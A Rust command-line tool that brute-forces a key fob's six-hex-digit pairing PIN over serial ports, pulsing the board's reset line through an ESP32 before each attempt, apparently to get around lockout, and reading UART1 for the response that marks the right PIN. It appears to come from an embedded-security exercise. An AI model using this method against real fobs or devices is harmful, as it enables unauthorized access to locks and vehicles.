use std::{thread, time::Duration};

use clap::{arg, Parser};
use serialport::SerialPort;

#[derive(Parser)]
struct Args {
    /// PIN to start cracking from. Default = 000000.
    #[arg(short, long)]
    start_pin: Option<String>,

    /// PIN to stop cracking at (inclusive). Default = ffffff.
    #[arg(short = 't', long)]
    stop_pin: Option<String>,

    /// How often to output the current PIN attempt in seconds. Default = 1.
    #[arg(short, long)]
    current_pin_interval: Option<u32>,

    /// Delay between PIN attempts in milliseconds. Default = 1.
    #[arg(short, long)]
    pin_attempt_delay: Option<u32>,

    /// Board number to run the script on according to the ESP32 (0 or 1).
    board_number: u8,

    /// Serial device of the paired fob's UART0.
    uart0_serial_file_name: String,

    /// Serial device of the paired fob's UART1.
    uart1_serial_file_name: String,

    /// Serial device of the ESP32 TI board controller.
    esp32_serial_file_name: String,
}

const BAUD_RATE: u32 = 115200;
const DEFAULT_START_PIN: u32 = 0;
const DEFAULT_STOP_PIN: u32 = 0xffffff;
const DEFAULT_CURRENT_PIN_INTERVAL: u32 = 1; // In seconds.
const DEFAULT_PIN_ATTEMPT_DELAY: u32 = 1; // In milliseconds.
const RESET_HOLD_TIME: u64 = 20; // In microseconds.

fn pair(uart0: &mut Box<dyn SerialPort>, pin: u32) {
    let start_msg = [b'P'];
    uart0
        .write_all(&start_msg)
        .expect("Failed to write to UART0.");

    thread::sleep(Duration::from_micros(200));

    let pin_str = format!("{pin:06x}");
    uart0
        .write_all(pin_str.as_bytes())
        .expect("Failed to write to UART0.");
}

fn main() {
    let args = Args::parse();
    let pin_attempt_delay = args.pin_attempt_delay.unwrap_or(DEFAULT_PIN_ATTEMPT_DELAY);

    let start_pin = match u32::from_str_radix(
        &args.start_pin.unwrap_or(format!("{:x}", DEFAULT_START_PIN)),
        16,
    ) {
        Ok(pin) => pin,
        Err(_) => {
            println!("Failed to parse start PIN.");
            return;
        }
    };

    if start_pin > DEFAULT_STOP_PIN {
        println!("Start PIN is greater than the highest PIN.");
        return;
    }

    let stop_pin = match u32::from_str_radix(
        &args.stop_pin.unwrap_or(format!("{:x}", DEFAULT_STOP_PIN)),
        16,
    ) {
        Ok(pin) => pin,
        Err(_) => {
            println!("Failed to parse stop PIN.");
            return;
        }
    };

    if stop_pin > DEFAULT_STOP_PIN {
        println!("Stop PIN is greater than the highest PIN.");
        return;
    }

    if start_pin > stop_pin {
        println!("Start PIN is greater than stop PIN.");
        return;
    }

    let current_pin_interval = args
        .current_pin_interval
        .unwrap_or(DEFAULT_CURRENT_PIN_INTERVAL);

    let iterations_between_current_pin_output = (current_pin_interval * 1000) / pin_attempt_delay;

    if args.board_number != 0 && args.board_number != 1 {
        println!("Board number must be 0 or 1.");
        return;
    }

    let mut uart0 = serialport::new(args.uart0_serial_file_name, BAUD_RATE)
        .open()
        .expect("Failed to open UART0 serial port.");

    let mut uart1 = serialport::new(args.uart1_serial_file_name, BAUD_RATE)
        .timeout(Duration::from_millis(pin_attempt_delay.into()))
        .open()
        .expect("Failed to open UART1 serial port.");

    uart1
        .clear(serialport::ClearBuffer::All)
        .expect("Failed to clear UART1 serial port.");

    let mut esp32 = serialport::new(args.esp32_serial_file_name, BAUD_RATE)
        .open()
        .expect("Failed to open ESP32 serial port.");

    esp32
        .write_all(format!("h{}1\n", args.board_number).as_bytes())
        .expect("Failed to write to ESP32."); // Make sure SW1 is not pressed.

    thread::sleep(Duration::from_millis(1));

    esp32
        .write_all(format!("h{}2\n", args.board_number).as_bytes())
        .expect("Failed to write to ESP32."); // Make sure SW2 is not pressed.

    let lower_reset_string = format!("l{}r\n", args.board_number);
    let raise_reset_string = format!("h{}r\n", args.board_number);
    let lower_reset_bytes = lower_reset_string.as_bytes();
    let raise_reset_bytes = raise_reset_string.as_bytes();

    for pin in start_pin..=stop_pin {
        esp32
            .write_all(lower_reset_bytes)
            .expect("Failed to write to ESP32.");

        thread::sleep(Duration::from_micros(RESET_HOLD_TIME));

        esp32
            .write_all(raise_reset_bytes)
            .expect("Failed to write to ESP32.");

        pair(&mut uart0, pin);

        if pin % iterations_between_current_pin_output == 0 {
            println!("Last PIN tried: {:06x}", pin);
        }

        let mut buf = [0u8; 1];
        match uart1.read(&mut buf) {
            Ok(_) => {
                println!("Found PIN: {:06x}", pin);
                println!("Read byte: {:02x}", buf[0]);
                return;
            }
            Err(e) => match e.kind() {
                std::io::ErrorKind::TimedOut => {}
                _ => panic!("Failed to read from UART1: {}", e),
            },
        }
    }
}
